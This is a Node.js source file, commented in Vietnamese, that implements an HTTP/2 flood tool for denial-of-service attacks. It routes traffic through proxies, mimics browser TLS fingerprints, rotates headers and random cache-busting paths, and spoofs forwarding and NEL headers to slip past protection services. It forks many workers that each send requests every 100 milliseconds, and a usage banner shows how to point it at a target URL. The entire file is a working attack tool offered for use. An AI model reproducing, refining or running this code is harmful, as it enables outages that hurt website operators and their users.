const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const chalk = require("chalk");

// Cấu hình cipher và secure options
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
].join(":");
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureProtocol = "TLS_method";
const secureContext = tls.createSecureContext({
    ciphers,
    sigalgs,
    honorCipherOrder: true,
    secureOptions,
    secureProtocol
});

// Danh sách header động
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
];
const cache_header = [
    'no-cache',
    'no-store',
    'must-revalidate',
    'max-age=0'
];
const language_header = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9',
    'fr-FR,fr;q=0.8',
    'es-ES,es;q=0.8'
];
const fetch_site = ["same-origin", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "cors"];
const fetch_dest = ["document", "subresource", "unknown"];
const cplist = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
];

// Xử lý lỗi toàn cục
const errorHandler = error => console.error(chalk.red(`[LỖI] ${error.message}`));
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

// Màu sắc cho log
const colors = {
    COLOR_RED: "\x1b[31m",
    COLOR_GREEN: "\x1b[32m",
    COLOR_YELLOW: "\x1b[33m",
    COLOR_RESET: "\x1b[0m"
};

function colored(colorCode, text) {
    console.log(colorCode + text + colors.COLOR_RESET);
}

// Hàm tạo chuỗi ngẫu nhiên
function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
}

// Hàm chọn ngẫu nhiên
function randomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// Lớp NetSocket để xử lý kết nối qua proxy
class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "Lỗi: Phản hồi không hợp lệ từ proxy");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "Lỗi: Hết thời gian chờ");
        });

        connection.on("error", err => {
            connection.destroy();
            return callback(undefined, `Lỗi kết nối proxy: ${err.message}`);
        });
    }
}

const Socker = new NetSocket();

// Hàm chạy flood
function runFlooder(targetURL, proxy, cookies, userAgent, rate, duration) {
    const parsedTarget = url.parse(targetURL);
    const parsedProxy = proxy.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 1
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            colored(colors.COLOR_RED, `[LỖI] ${error}`);
            return;
        }

        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsOptions = {
            port: parsedPort,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: randomElement(cplist),
            sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureOptions,
            secureContext,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol
        };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 600000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                headerTableSize: 1048576,
                maxHeaderListSize: 1048576,
                initialWindowSize: 2147483647,
                maxFrameSize: 65536
            }
        });

        client.setMaxListeners(0);
        client.settings({
            enablePush: false,
            initialWindowSize: 147483647
        });

        client.on("connect", () => {
            let requestCount = 0;
            const interval = setInterval(() => {
                for (let i = 0; i < rate; i++) {
                    const headers = {
                        ":authority": parsedTarget.host,
                        ":scheme": "https",
                        ":path": parsedTarget.path + "?" + generateRandomString(3, 5) + "=" + generateRandomString(10, 25),
                        ":method": "GET",
                        "user-agent": userAgent,
                        "accept": randomElement(accept_header),
                        "accept-encoding": randomElement(["gzip, deflate, br", "compress, gzip", "deflate, gzip"]),
                        "accept-language": randomElement(language_header),
                        "cache-control": randomElement(cache_header),
                        "sec-fetch-mode": randomElement(fetch_mode),
                        "sec-fetch-site": randomElement(fetch_site),
                        "sec-fetch-dest": randomElement(fetch_dest),
                        ...(cookies && { cookie: cookies }),
                        "x-forwarded-for": parsedProxy[0],
                        "nel": JSON.stringify({
                            "report_to": Math.random() < 0.5 ? "cf-nel" : "default",
                            "max-age": Math.random() < 0.5 ? 31536000 : 2561000,
                            "include_subdomains": Math.random() < 0.5
                        })
                    };

                    const request = client.request(headers, {
                        parent: 0,
                        exclusive: true,
                        weight: 220
                    });

                    request.on('response', () => {
                        request.close();
                        request.destroy();
                        requestCount++;
                        colored(colors.COLOR_YELLOW, `[THÔNG TIN] Đã gửi yêu cầu ${requestCount} tới ${targetURL}`);
                    });

                    request.on('error', err => {
                        colored(colors.COLOR_RED, `[LỖI] Lỗi yêu cầu: ${err.message}`);
                        request.destroy();
                    });

                    request.end();
                }
            }, 100); // Gửi yêu cầu mỗi 100ms để tăng tốc độ

            setTimeout(() => {
                clearInterval(interval);
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
                colored(colors.COLOR_YELLOW, `[THÔNG TIN] Hoàn tất flood ${targetURL} với ${requestCount} yêu cầu`);
            }, duration * 1000);
        });

        client.on("error", err => {
            colored(colors.COLOR_RED, `[LỖI] Lỗi HTTP/2: ${err.message}`);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        client.on("timeout", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
    });
}

// Hàm chính
if (cluster.isMaster) {
    // Kiểm tra tham số dòng lệnh
    if (process.argv.length < 9) {
        console.clear();
        console.log(`
${chalk.cyanBright('CÔNG CỤ FLOOD HTTP/2')} | Cập nhật: 29/09/2025

${chalk.blueBright('Cách dùng:')}
  ${chalk.redBright(`node ${process.argv[1]} <target> <duration> <threads> <proxy> <rate> <cookies> <userAgent>`)}
  ${chalk.yellowBright(`Ví dụ: node ${process.argv[1]} https://example.com 60 2 192.168.1.1:8080 50 "cookie1=value1; cookie2=value2" "BROWSER-V3.0/..."`)}
`);
        process.exit(1);
    }

    const targetURL = process.argv[2];
    const duration = parseInt(process.argv[3]);
    const threads = parseInt(process.argv[4]);
    const proxy = process.argv[5];
    const rate = parseInt(process.argv[6]);
    const cookies = process.argv[7];
    const userAgent = process.argv[8];

    // Kiểm tra URL
    if (!/^https?:\/\//i.test(targetURL)) {
        colored(colors.COLOR_RED, '[LỖI] URL phải bắt đầu bằng http:// hoặc https://');
        process.exit(1);
    }

    // Log thông tin
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Đang chạy...`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Mục tiêu: ${targetURL}`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Thời gian: ${duration} giây`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Luồng: ${threads}`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Proxy: ${proxy}`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Tốc độ: ${rate} yêu cầu/giây`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Cookies: ${cookies || 'không có'}`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] User-Agent: ${userAgent}`);

    // Quản lý RAM
    const MAX_RAM_PERCENTAGE = 99;
    const RESTART_DELAY = 1000;

    const handleRAMUsage = () => {
        const totalRAM = require('os').totalmem();
        const usedRAM = totalRAM - require('os').freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            colored(colors.COLOR_RED, `[LỖI] RAM sử dụng vượt ngưỡng: ${ramPercentage.toFixed(2)}%`);
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
            setTimeout(() => {
                for (let counter = 1; counter <= threads; counter++) {
                    cluster.fork();
                }
            }, RESTART_DELAY);
        }
    };

    setInterval(handleRAMUsage, 5000);

    // Khởi động các worker
    for (let counter = 1; counter <= threads; counter++) {
        cluster.fork();
    }

    // Thoát sau thời gian duration
    setTimeout(() => {
        colored(colors.COLOR_YELLOW, '[THÔNG TIN] Hết thời gian! Dọn dẹp...');
        process.exit(0);
    }, duration * 1000);
} else {
    // Worker chạy flood
    const targetURL = process.argv[2];
    const duration = parseInt(process.argv[3]);
    const proxy = process.argv[5];
    const rate = parseInt(process.argv[6]);
    const cookies = process.argv[7];
    const userAgent = process.argv[8];

    setInterval(() => runFlooder(targetURL, proxy, cookies, userAgent, rate, duration), 100);
}